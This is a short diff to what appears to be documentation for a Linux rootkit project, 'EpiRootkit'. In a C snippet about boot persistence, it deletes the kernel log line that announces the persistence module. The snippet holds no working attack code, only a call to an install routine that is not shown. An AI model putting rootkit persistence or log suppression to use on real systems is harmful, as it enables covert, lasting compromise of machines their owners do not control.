@@ -36,7 +36,6 @@ Multiple boot persistence mechanisms to ensure rootkit survival across system re
 ```c
 int persistence_init(void)
 {
-    pr_info("EpiRootkit: Persistence module initialized\n");
     return persistence_install(); // Install all mechanisms
 }
 ```
